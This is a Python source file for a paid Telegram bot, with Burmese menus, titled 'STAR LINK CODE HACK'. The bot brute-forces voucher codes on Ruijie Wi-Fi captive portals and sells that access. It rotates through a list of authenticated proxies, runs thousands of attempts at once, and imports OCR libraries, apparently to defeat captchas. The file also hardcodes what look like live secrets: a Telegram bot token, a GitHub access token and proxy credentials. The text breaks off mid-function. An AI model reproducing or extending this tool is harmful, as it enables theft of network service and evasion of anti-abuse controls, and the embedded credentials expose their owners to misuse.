from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone
import asyncio
import os
import time
import uuid
import random
import string
import base64
import json
import concurrent.futures
import re

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8956226519:AAGq2JHV44oGcXItrYVShOTHHnEoo9XQCvU"
GITHUB_TOKEN = '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'
REPO_OWNER = "kuranomi10"
REPO_NAME = "S"

# ==================== ADMIN CONFIGURATION ====================
ADMINS = [
    "7366841341",     
    "8728200516"      
]

ADMIN_USERNAME = "@kuranomi | @makxcross_admin"

def is_admin(user_id):
    return str(user_id) in ADMINS

# ==================== PROXY CONFIGURATION ====================
PROXY_LIST = [
    "qzlcjnyl:wzn5y6qxtn3s@31.59.20.176:6754",
    "qzlcjnyl:wzn5y6qxtn3s@31.56.127.193:7684",
    "qzlcjnyl:wzn5y6qxtn3s@45.38.107.97:6014",
    "qzlcjnyl:wzn5y6qxtn3s@198.105.121.200:6462",
    "qzlcjnyl:wzn5y6qxtn3s@64.137.96.74:6641",
    "qzlcjnyl:wzn5y6qxtn3s@198.23.243.226:6361",
    "qzlcjnyl:wzn5y6qxtn3s@38.154.185.97:6370",
    "qzlcjnyl:wzn5y6qxtn3s@84.247.60.125:6095",
    "qzlcjnyl:wzn5y6qxtn3s@142.111.67.146:5611",
    "qzlcjnyl:wzn5y6qxtn3s@191.96.254.138:6185",
    "qtbrstqq:fa915rth9mt3@31.59.20.176:6754",
    "qtbrstqq:fa915rth9mt3@31.56.127.193:7684",
    "qtbrstqq:fa915rth9mt3@45.38.107.97:6014",
    "qtbrstqq:fa915rth9mt3@198.105.121.200:6462",
    "qtbrstqq:fa915rth9mt3@64.137.96.74:6641",
    "qtbrstqq:fa915rth9mt3@198.23.243.226:6361",
    "qtbrstqq:fa915rth9mt3@38.154.185.97:6370",
    "qtbrstqq:fa915rth9mt3@84.247.60.125:6095",
    "qtbrstqq:fa915rth9mt3@142.111.67.146:5611",
    "qtbrstqq:fa915rth9mt3@191.96.254.138:6185",
    "uiustfqc:fy4sf6colyc8@31.59.20.176:6754",
    "uiustfqc:fy4sf6colyc8@31.56.127.193:7684",
    "uiustfqc:fy4sf6colyc8@45.38.107.97:6014",
    "uiustfqc:fy4sf6colyc8@198.105.121.200:6462",
    "uiustfqc:fy4sf6colyc8@64.137.96.74:6641",
    "uiustfqc:fy4sf6colyc8@198.23.243.226:6361",
    "uiustfqc:fy4sf6colyc8@38.154.185.97:6370",
    "uiustfqc:fy4sf6colyc8@84.247.60.125:6095",
    "uiustfqc:fy4sf6colyc8@142.111.67.146:5611",
    "uiustfqc:fy4sf6colyc8@191.96.254.138:6185",
    "iharxufm:r6x3058shuft@31.59.20.176:6754",
    "iharxufm:r6x3058shuft@31.56.127.193:7684",
    "iharxufm:r6x3058shuft@45.38.107.97:6014",
    "iharxufm:r6x3058shuft@198.105.121.200:6462",
    "iharxufm:r6x3058shuft@64.137.96.74:6641",
    "iharxufm:r6x3058shuft@198.23.243.226:6361",
    "iharxufm:r6x3058shuft@38.154.185.97:6370",
    "iharxufm:r6x3058shuft@84.247.60.125:6095",
    "iharxufm:r6x3058shuft@142.111.67.146:5611",
    "iharxufm:r6x3058shuft@191.96.254.138:6185",
    "yrtyhpkt:0e8539pcyfqa@31.59.20.176:6754",
    "yrtyhpkt:0e8539pcyfqa@31.56.127.193:7684",
    "yrtyhpkt:0e8539pcyfqa@45.38.107.97:6014",
    "yrtyhpkt:0e8539pcyfqa@198.105.121.200:6462",
    "yrtyhpkt:0e8539pcyfqa@64.137.96.74:6641",
    "yrtyhpkt:0e8539pcyfqa@198.23.243.226:6361",
    "yrtyhpkt:0e8539pcyfqa@38.154.185.97:6370",
    "yrtyhpkt:0e8539pcyfqa@84.247.60.125:6095",
    "yrtyhpkt:0e8539pcyfqa@142.111.67.146:5611",
    "yrtyhpkt:0e8539pcyfqa@191.96.254.138:6185",
]

_proxy_index = 0
def get_next_proxy():
    global _proxy_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    return f"http://{proxy}"

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
session = None
_connector = None

# ==================== SPEED & PROXY OPTIMIZATION ====================
MAX_CONCURRENT_SCANS = 200
CONCURRENCY = 5000
BATCH_SIZE = 5000
_active_scans_count = 0
_active_scans_lock = asyncio.Lock()
_voucher_sem = None
_start_time = time.monotonic()
_connection_pool = {}
_proxy_pool_index = 0
_session_cache = {}
_session_cache_lock = asyncio.Lock()
_ocr_executor = concurrent.futures.ThreadPoolExecutor(max_workers=20)

def get_cached_session(proxy=None):
    proxy_url = proxy or get_proxy_round_robin()
    key = proxy_url or "default"
    if key not in _connection_pool or _connection_pool[key].closed:
        timeout = aiohttp.ClientTimeout(total=15, sock_connect=5)
        conn = aiohttp.TCPConnector(
            limit=500,
            limit_per_host=200,
            ttl_dns_cache=600,
            ssl=False,
            force_close=False,
            enable_cleanup_closed=True
        )
        _connection_pool[key] = aiohttp.ClientSession(
            timeout=timeout,
            connector=conn,
            connector_owner=True,
            cookie_jar=aiohttp.CookieJar()
        )
    return _connection_pool[key], proxy_url

def get_proxy_round_robin():
    global _proxy_pool_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_pool_index % len(PROXY_LIST)]
    _proxy_pool_index += 1
    return f"http://{proxy}"

paid_users = {}
portal_storage = {}

async def get_portal_url(user_id):
    user_id_str = str(user_id)
    if user_id_str in portal_storage:
        return portal_storage[user_id_str]
    try:
        data, _ = await get_file_content("portal_urls.json")
        if user_id_str in data:
            portal_storage[user_id_str] = data[user_id_str]
            return data[user_id_str]
    except:
        pass
    return None

async def save_portal_url(user_id, url):
    user_id_str = str(user_id)
    portal_storage[user_id_str] = url
    try:
        data, sha = await get_file_content("portal_urls.json")
        if data is None:
            data = {}
        data[user_id_str] = url
        await update_file_content("portal_urls.json", data, sha, f"Update portal for {user_id_str}")
    except:
        try:
            await update_file_content("portal_urls.json", {user_id_str: url}, None, f"Create portal for {user_id_str}")
        except:
            pass

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def get_file_content(path):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        async with session.get(url, headers=headers) as response:
            if response.status == 200:
                data = await response.json()
                content = base64.b64decode(data['content']).decode('utf-8')
                return json.loads(content), data['sha']
            return {}, None
    except:
        return {}, None

async def update_file_content(path, content, sha, message):
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Content-Type": "application/json"
    }
    encoded = base64.b64encode(json.dumps(content).encode()).decode()
    payload = {
        "message": message,
        "content": encoded,
    }
    if sha:
        payload["sha"] = sha
    async with session.put(url, headers=headers, json=payload) as response:
        return await response.text()

# ==================== KEYBOARD FUNCTIONS ====================

def get_scan_codes_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
        InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
        InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
        InlineKeyboardButton("🔤 VOUCHER ascii-lower", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("🎲 VOUCHER all", callback_data="scan_all"),
        InlineKeyboardButton("🔤+🔢 MIXED 6လုံး (x3kark)", callback_data="scan_mixed"),
        InlineKeyboardButton("🔤+🔢 MIXED 8လုံး (8twcqeb)", callback_data="scan_mixed8"),
        InlineKeyboardButton("🚀 START SCAN", callback_data="menu_start_scam"),
        InlineKeyboardButton("🛑 STOP SCAN", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🎫 PAID USER", callback_data="menu_paid"),
        InlineKeyboardButton("🔗 STAR LINK Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton("📋 Success Codes ကြည့်မည်", callback_data="menu_result"),
        InlineKeyboardButton("🔄 Recheck ပြန်လုပ်စစ်မည်", callback_data="menu_recheck"),
        InlineKeyboardButton("🛑 Scan ရပ်မည်", callback_data="menu_stop"),
        InlineKeyboardButton("🔍 SCAN CODES", callback_data="menu_scan_codes"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔢 VOUCHER 6 လုံး", callback_data="scan_6"),
        InlineKeyboardButton("🔢 VOUCHER 7 လုံး", callback_data="scan_7"),
        InlineKeyboardButton("🔢 VOUCHER 8 လုံး", callback_data="scan_8"),
        InlineKeyboardButton("🔤 VOUCHER ascii-lower", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("🎲 VOUCHER all", callback_data="scan_all"),
        InlineKeyboardButton("🔤+🔢 MIXED 6လုံး (x3kark)", callback_data="scan_mixed"),
        InlineKeyboardButton("🔤+🔢 MIXED 8လုံး (8twcqeb)", callback_data="scan_mixed8"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = []
    for i in range(10):
        buttons.append(InlineKeyboardButton(str(i), callback_data=f"digit_{mode}_{i}"))
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("🎲 Random ဖြစ်ရှာရန်", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🚀 START SCAM", callback_data="menu_start_scam"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_paid_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("✅ PAID USER ဖြစ်ရန် နှိပ်ပါ", callback_data="menu_enter_userid"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("🛑 STOP SCAM", callback_data="menu_stop"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back")
    )
    return keyboard

@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    saved_url = await get_portal_url(user_id)
    if saved_url:
        user_data[message.chat.id]['session_url'] = saved_url
    
    if user_id in paid_users or user_id in approve:
        approve[message.chat.id] = True
        welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

🎉 မင်္ဂလာပါခင်ဗျာ! 
✅ သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။
♾️ Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။

အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"""
    else:
        welcome_text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။

PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။
👨‍💻 Admin: {ADMIN_USERNAME}"""
    
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard())

@bot.message_handler(commands=['sendall'])
async def send_all_broadcast(message):
    if not is_admin(message.chat.id):
        return
    
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /sendall [your_message]")
        return
    
    broadcast_text = f"📢 ADMIN NOTIFICATION\n\n{args[1]}"
    auth_list, _ = await get_file_content("auth_list.json")
    
    count = 0
    for uid in auth_list:
        try:
            await bot.send_message(int(uid), broadcast_text)
            count += 1
            await asyncio.sleep(0.1)
        except:
            continue
            
    await bot.reply_to(message, f"✅ User {count} ယောက်ထံသို့ စာပို့ပြီးပါပြီ။")

@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"
    
    if call.data == "menu_scan_codes":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        text = f"""🔍 **SCAN CODES MENU**

👤 NAME: {user_name}
🆔 USER ID: {user_id}

အောက်ပါ VOUCHER အမျိုးအစားများထဲမှ ရွေးချယ်ပြီး START SCAN နှိပ်ပါ။

📌 **VOUCHER Types:**
• 6, 7, 8 - ဂဏန်းသက်သက်
• ascii-lower - အင်္ဂလိပ်စာလုံးအသေး
• all - စာလုံး + ဂဏန်း ရောထွေး
• mixed - စာလုံးအသေး + ဂဏန်း ၆လုံး
• mixed8 - စာလုံးအသေး + ဂဏန်း ၈လုံး

🛑 STOP SCAN နှိပ်ပြီး ရပ်တန့်နိုင်ပါသည်။"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_scan_codes_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_back":
        if user_id in paid_users or user_id in approve:
            text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

✅ PAID USER - Unlimited Access"""
        else:
            text = f"""✨ STAR LINK CODE HACK ✨

👤 NAME: {user_name}
🆔 USER ID: {user_id}

⚠️ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။

PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_main_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_free_trial":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        text = f"""🔗 Portal URL ထည့်သွင်းရန်:

/portal [your_portal_url]

ဥပမာ:
/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00

Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွားမည်ဖြစ်သည်။"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_start_scam":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        global _active_scans_count
        async with _active_scans_lock:
            if _active_scans_count >= MAX_CONCURRENT_SCANS:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"⚠️ Bot အလုပ်များနေပါသည်။ လက်ရှိ {_active_scans_count}/{MAX_CONCURRENT_SCANS} ယောက် scan လုပ်နေပါသည်။\n\nခဏစောင့်ပြီးမှ ထပ်ကြိုးစားပါ။",
                    reply_markup=get_back_keyboard()
                )
                await bot.answer_callback_query(call.id)
                return
            _active_scans_count += 1
        
        if chat_id not in user_data or 'selected_mode' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="❌ VOUCHER အမျိုးအစားမရွေးရသေးပါ။ ကျေးဇူးပြု၍ VOUCHER အရင်ရွေးပါ။",
                reply_markup=get_scan_codes_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        mode = user_data[chat_id]['selected_mode']
        start_digit = user_data[chat_id].get('start_digit')
        
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
                reply_markup=get_scam_button_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"🔍 Scan စတင်နေပါသည်...\n\n🔢 VOUCHER Mode: {mode}\n\nSTOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
            reply_markup=get_scam_button_keyboard(),
            parse_mode="Markdown"
        )
        
        progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
        scan_id = str(uuid.uuid4())
        
        try:
            portal_url = user_data[chat_id].get('session_url', 'Unknown')
            last_url = user_data[chat_id].get('last_admin_notified_url', '')
            
            if portal_url != last_url and portal_url != 'Unknown':
                admin_msg = f"🚀 **Scan Start Notification**\n\n👤 **User:** {user_name}\n🆔 **User ID:** `{user_id}`\n🔢 **Mode:** {mode}\n🔗 **Portal URL:**\n`{portal_url}`"
                for admin_id in ADMINS:
                    try:
                        await bot.send_message(admin_id, admin_msg, parse_mode="Markdown")
                    except:
                        pass
                user_data[chat_id]['last_admin_notified_url'] = portal_url
        except Exception as e:
            print(f"Admin Notification Error: {e}")

        task = asyncio.create_task(
            run_bruteforce(
                mode,
                chat_id,
                user_data[chat_id]['session_url'],
                scan_id,
                message=call.message,
                progress_msg=progress_msg,
                start_digit=start_digit
            )
        )
        
        scan_tasks[chat_id] = {
            "task": task,
            "stop": False,
            "scan_id": scan_id
        }
        
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_paid":
        text = f"""🔑 PAID USER ဖြစ်ရန်

ကျေးဇူးပြု၍ သင်၏ USER ID ကိုထည့်သွင်းပါ။

USER ID: {user_id}

✅ သင်၏ USER ID ကို Admin ထံ ပေးပို့ပြီး Key ဝယ်ယူပါ။
👨‍💻 Admin: {ADMIN_USERNAME}

Key ရရှိပြီးပါက PAID USER ဖြစ်ရန် နှိပ်ပါ"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_paid_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_enter_userid":
        auth_list, _ = await get_file_content("auth_list.json")
        
        if user_id in auth_list:
            valid = check_key_expiration(auth_list[user_id])
            if valid:
                approve[chat_id] = True
                paid_users[user_id] = True
                if chat_id not in user_data:
                    user_data[chat_id] = {}
                
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}\n\nအောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။",
                    reply_markup=get_main_keyboard()
                )
            else:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"❌ သင်၏ Key Expired ဖြစ်နေပါသည်။ ကျေးဇူးပြု၍ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                    reply_markup=get_back_keyboard()
                )
        else:
            for admin_id in ADMINS:
                try:
                    await bot.send_message(
                        chat_id=admin_id,
                        text=f"🔔 New User Request:\nName: {user_name}\nID: {user_id}\n\nTo approve:\n/genkey unlimited {user_id}"
                    )
                except:
                    pass
            
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"🙏 ကျေးဇူးပြု၍ Paid ဝယ်ယူပါ။\n\nUSER ID: {user_id}\n\nAdmin မှ သင့် ID ကို အတည်ပြုပြီးပါက PAID USER ဖြစ်ပါမည်။\n👨‍💻 Admins: {ADMIN_USERNAME}",
                reply_markup=get_back_keyboard()
            )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_result":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        results, _ = await get_file_content("result.json")
        if user_id in results and results[user_id]:
            codes = "\n".join(results[user_id])
            text = f"✅ Found Codes:\n{codes}"
        else:
            text = "📋 သင့်တွင် ယခင်ကရရှိထားသော success code မရှိသေးပါ။"
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_recheck":
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="🔄 Recheck ကို စတင်နေပါသည်...",
            reply_markup=get_scam_button_keyboard()
        )
        await recheck_command(call.message)
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
        return
    
    if call.data.startswith("scan_"):
        if user_id not in paid_users and user_id not in approve:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        mode = call.data.replace("scan_", "")
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        
        if 'session_url' not in user_data[chat_id]:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="🔗 ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return

        if mode in ["6", "7", "8"]:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -",
                reply_markup=get_digit_keyboard(mode)
            )
            await bot.answer_callback_query(call.id)
            return

        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None
        
        text = f"""🔍 သင်ရွေးချယ်ထားသော VOUCHER အမျိုးအစား: {mode}

✅ START SCAN ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။
🛑 STOP SCAN ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_start_scam_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        mode = parts[1]
        digit = parts[2]
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None if digit == "random" else digit
        
        text = f"🔍 VOUCHER Mode: {mode}\n"
        if digit == "random":
            text += "🔢 ထိပ်စီးနံပါတ်: Random ဖြစ်ရှာရန်"
        else:
            text += f"🔢 ထိပ်စီးနံပါတ်: {digit} မှစ၍ရှာမည်"
            
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text + "\n\n✅ START SCAN ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
            reply_markup=get_start_scam_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

async def recheck_command(message):
    chat_id = message.chat.id
    if not approve.get(chat_id, False) and str(chat_id) not in paid_users:
        await bot.reply_to(message, f"⚠️ သင့်တွင် PAID USER မဟုတ်ပါ။ PAID USER ဝယ်ယူရန် Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။")
        return
    
    results, sha = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
        if message.chat.id not in user_data:
            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
            return
        if "session_url" not in user_data.get(message.chat.id, {}):
            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
            return
        codes = results[chat_id_str]
        await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
        session_url_recheck = user_data[message.chat.id]["session_url"]
        recheck_list = []
        for code in codes:
            recode = await perform_check_optimized(
                session_url_recheck,
                code,
                chat_id,
                scan_id=None,
                recheck=True,
                message=message
            )
            if recode:
                recheck_list.append(recode)
        to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
        await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}")
        await save_rechecked_codes(chat_id_str, recheck_list, sha)
    else:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")

async def save_rechecked_codes(chat_id_str, recheck_list, sha):
    results, _ = await get_file_content("result.json")
    results[chat_id_str] = recheck_list
    await update_file_content("result.json", results, sha, f"Update after recheck for {chat_id_str}")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve, paid_users
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "🔑 ကျေးဇူးပြု၍ သင်၏ KEY ကိုထည့်သွင်းပါ:\n\n/key [your_key_here]")
        return
    
    key = args[1]
    user_id = str(message.chat.id)
    
    auth_list, _ = await get_file_content("auth_list.json")
    
    if key == user_id or user_id in auth_list or key in auth_list:
        valid = True
        if user_id in auth_list:
            valid = check_key_expiration(auth_list[user_id])
        elif key in auth_list:
            valid = check_key_expiration(auth_list[key])
        
        if valid:
            approve[message.chat.id] = True
            paid_users[user_id] = True
            if message.chat.id not in user_data:
                user_data[message.chat.id] = {}
            await bot.reply_to(
                message,
                f"✅ PAID USER ဖြစ်ပါပြီ။\n\nUSER ID: {user_id}\n\nအောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"
            )
        else:
            await bot.reply_to(
                message,
                "❌ Key Expired ဖြစ်နေပါသည်။"
            )
    else:
        await bot.reply_to(
            message,
